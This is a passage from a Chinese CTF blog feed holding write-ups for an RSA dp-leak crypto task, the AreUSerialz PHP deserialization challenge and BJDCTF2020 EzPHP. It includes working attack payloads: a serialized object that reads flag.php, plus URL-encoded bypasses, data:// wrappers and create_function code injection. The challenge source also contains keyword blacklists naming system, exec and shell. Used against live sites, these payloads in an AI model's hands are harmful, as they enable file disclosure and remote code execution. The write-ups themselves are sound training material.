rsa.PrivateKey(n, e, <span class="built_in">int</span>(d), p, q)                                              <span class="comment">#RSA求解私钥（固定格式）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>, <span class="string">&quot;rb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f = f.read()</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(f, key))                                                        <span class="comment">#rsa解密，需加密后的问件及私钥值。</span></span><br></pre></td></tr></table></figure><p>得flag<code>flag&#123;decrypt_256&#125;</code>。<br><img src="/2020/10/25/BUUOJ%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98-%E4%B8%80%E8%88%ACRSA//1.png"></p><h2 id="2-RSA2"><a href="#2-RSA2" class="headerlink" title="2.RSA2"></a>2.RSA2</h2><p>文件内容如下</p><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">e <span class="built_in">=</span> <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n <span class="built_in">=</span> <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line"></span><br><span class="line">dp <span class="built_in">=</span> <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c <span class="built_in">=</span> <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br></pre></td></tr></table></figure><p>众所周知，一般的rsa有n、e、c就能求出明文了，但是仅仅是对于容易进行大素数分解的情况，就是<code>n</code>可以分解为两个大素数的情况下，但是有的n恰恰非常难分解，这就需要大量的时间用来分解n，此时若是引入另外的参数，就能更快速地求解出<code>p、q</code>:</p><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp <span class="built_in">=</span> d <span class="comment">% (p - 1)</span></span><br><span class="line">dq <span class="built_in">=</span> d <span class="comment">% (q - 1)</span></span><br></pre></td></tr></table></figure><p><del>还没学到，我的天。</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, powmod</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line"></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">        p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q=n//p</span><br><span class="line">        phin=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d=invert(e, phin)</span><br><span class="line">        m=powmod(c, d, n)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;m:&quot;</span>,m)</span><br><span class="line">        <span class="comment">#print(hex(m)[2:])</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p><code>flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;</code><br><a href="https://blog.csdn.net/weixin_45369385/article/details/109208109">RSA-详解dp泄漏</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯-2020-青龙组-AreUSerialz</title>
      <link href="/2020/10/25/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/"/>
      <url>/2020/10/25/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/</url>
      
        <content type="html"><![CDATA[<blockquote><p>PS:真不是我想鸽，是真的还没做出来卡到那里了。。</p></blockquote><blockquote><p>老文章了，今天搞的那一题因为身体原因没做完，老文章再看看也能温习一下已经快要遗忘了的知识点。</p></blockquote><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>没参加比赛，明年说不定就要参加了，毕竟报了信息安全，不弄个像样点的资历到时候也不好找工作（不过我想考研）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">/*上面都是类的内容*/</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>太长的代码审计了，但是核心就是利用点，就是<code>read()</code>函数了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>file_get_contents($this-&gt;filename)</code>，我们只需要传入我们需要的&#x2F;flag，一读就OK了。<br>下面是利用payload制作的php代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line">public $op = 2;</span><br><span class="line">public $filename = &quot;flag.php&quot;;</span><br><span class="line">public $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new FileHandler();</span><br><span class="line">$ser = serialize($obj);</span><br><span class="line">var_dump($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>这里为什么不用protected的变量类型呢？这里的原因有待探究（可能是127号ascii的值被过滤了？）。<br>但是这种绕过方式值得学习一下</p><blockquote><p>在php7.1+对类属性的检测不严格，所以可以用public来绕过  –来自网络</p></blockquote><p>好没怎么研究特性，这也太知识盲区了。。。</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>直接看源码的最下面就catch flag了。</p><blockquote><p>另外，今天是99重阳节，希望家里的人都好好的。</p></blockquote><p><del>一天一篇，明天绝对不鸽</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-EzPHP</title>
      <link href="/2020/10/24/BJDCTF2020-EzPHP/"/>
      <url>/2020/10/24/BJDCTF2020-EzPHP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有时候会讨厌戴眼镜，因为这样看得太清晰还不如模糊一点，可近视的人总要戴上眼镜看世界的，<code>加油，双非人!</code></p></blockquote><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>首先F12查源码发现提示如下图<br><img src="/2020/10/24/BJDCTF2020-EzPHP//1.png" alt="1.png">，然后<code>base32</code>解码后获得提示<code>1nD3x.php</code>，访问后获得源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file = &quot;1nD3x.php&quot;;</span><br><span class="line">$shana = $_GET[&#x27;shana&#x27;];</span><br><span class="line">$passwd = $_GET[&#x27;passwd&#x27;];</span><br><span class="line">$arg = &#x27;&#x27;;</span><br><span class="line">$code = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">        )</span><br><span class="line">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?</span><br></pre></td></tr></table></figure><h2 id="1-绕过-SERVER-39-QUERY-STRING-39"><a href="#1-绕过-SERVER-39-QUERY-STRING-39" class="headerlink" title="1.绕过$_SERVER[&#39;QUERY_STRING&#39;]"></a>1.绕过<code>$_SERVER[&#39;QUERY_STRING&#39;]</code></h2><p>这个看wp说是这个里面并不会对参数进行url解码，所以可以将<code>payload</code>进行url编码后绕过。</p><h2 id="2-绕过if-preg-match-39-aqua-is-cute-39-GET-39-debu-39-amp-amp-GET-39-debu-39-39-aqua-is-cute-39-类型的preg-match"><a href="#2-绕过if-preg-match-39-aqua-is-cute-39-GET-39-debu-39-amp-amp-GET-39-debu-39-39-aqua-is-cute-39-类型的preg-match" class="headerlink" title="2.绕过if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)类型的preg_match()"></a>2.绕过<code>if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)</code>类型的preg_match()</h2><p>在payload后面加上<code>%0a</code>换行符可以绕过，本例中绕过为<code>?debu=auqa_is_cute%0a</code></p><h2 id="3-绕过-REQUEST"><a href="#3-绕过-REQUEST" class="headerlink" title="3.绕过$_REQUEST"></a>3.绕过<code>$_REQUEST</code></h2><p>因为<code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值(待解)。</p><p>这个只需要用<code>$_GET</code>上传payload的同时，<code>$_POST</code>上传一个数值数据就能绕过了。<a href="https://www.gem-love.com/ctf/770.html">出题人博客</a>。</p><h2 id="4-绕过file-get-contents-file-比较相同"><a href="#4-绕过file-get-contents-file-比较相同" class="headerlink" title="4.绕过file_get_contents($file)比较相同"></a>4.绕过file_get_contents($file)比较相同</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br></pre></td></tr></table></figure><p>这里一般能使用<code>php://input</code>、<code>data://</code>伪协议来绕过，那这里可以使用<code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p><h2 id="5-绕过sha1-函数比较"><a href="#5-绕过sha1-函数比较" class="headerlink" title="5.绕过sha1()函数比较"></a>5.绕过sha1()函数比较</h2><p>如果sha1()的参数为数组，就会返回false，那如果比较的双方皆为数组，比较的时候不就相等了吗？</p><h2 id="6-create-function-代码注入"><a href="#6-create-function-代码注入" class="headerlink" title="6.create_function()代码注入"></a>6.create_function()代码注入</h2><p>这个主要参见这位博主的文章<br><img src="/2020/10/24/BJDCTF2020-EzPHP//2.png"></p><p>通过这种方法可以执行任意命令。。。</p><h2 id="final-x2F-拿下flag"><a href="#final-x2F-拿下flag" class="headerlink" title="final&#x2F;.拿下flag"></a>final&#x2F;.拿下flag</h2><blockquote><p>pay attention: 这里用<code>hackbar</code>来测试。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#GET</span><br><span class="line"></span><br><span class="line">?data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute</span><br><span class="line">&amp;shana[]=1&amp;passwd[]=2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#POST</span><br><span class="line"></span><br><span class="line">debu=1&amp;file=2</span><br></pre></td></tr></table></figure><h3 id="01-create-function-得flag艰难旅途之一"><a href="#01-create-function-得flag艰难旅途之一" class="headerlink" title="01.create_function()得flag艰难旅途之一"></a>01.create_function()得flag艰难旅途之一</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#GET</span><br><span class="line"></span><br><span class="line">?debu=auqa_is_cute%0a&amp;shana[]=1&amp;passwd[]=2&amp;flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function&amp;file=data://text/plain,debu_debu_aqua</span><br><span class="line"></span><br><span class="line">上面的payload中的create_function()主要执行的函数是`var_dump(get_defined_vars());`</span><br><span class="line">其中`get_defined_vars()用来输出所有变量和值！`666。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># GET</span><br><span class="line"></span><br><span class="line">?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#POST</span><br><span class="line"></span><br><span class="line">debu=1&amp;file=2</span><br></pre></td></tr></table></figure><p><img src="/2020/10/24/BJDCTF2020-EzPHP//3.png"><br>得到提示<code>rea1fl4g.php</code></p><h3 id="02-create-function-得flag艰难旅途之二"><a href="#02-create-function-得flag艰难旅途之二" class="headerlink" title="02.create_function()得flag艰难旅途之二"></a>02.create_function()得flag艰难旅途之二</h3><p>最后create_function()函数也可以用以下来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))</span><br></pre></td></tr></table></figure><p>中间去翻的内容，取反之前为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=rea1fl4g.php</span><br></pre></td></tr></table></figure><p><img src="/2020/10/24/BJDCTF2020-EzPHP//4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PGh0bWw+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIG1heGltdW0tc2NhbGU9MSwgdXNlci1zY2FsYWJsZT1ubyI+DQo8dGl0bGU+UmVhbF9GbGFnIEluIEhlcmUhISE8L3RpdGxlPg0KPC9oZWFkPg0KPC9odG1sPg0KPD9waHANCgllY2hvICLlkqbvvIzkvaDlsYXnhLbmib7liLDmiJHkuobvvJ/vvIHkuI3ov4fnnIvliLDov5nlj6Xor53kuZ/kuI3ku6PooajkvaDlsLHog73mi7/liLBmbGFn5ZOm77yBIjsNCgkkZjRrZV9mbGFnID0gIkJKRHsxYW1fYV9mYWtlX2Y0MTExMWcyMzMzM30iOw0KCSRyZWExX2YxMTE0ZyA9ICJmbGFne2Q2ZGM4NGQzLTY5MGUtNDRhYi1iM2UyLWEwMzk0MDk1OWI1ZH0iOw0KCXVuc2V0KCRyZWExX2YxMTE0Zyk7DQo=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;&gt;</span><br><span 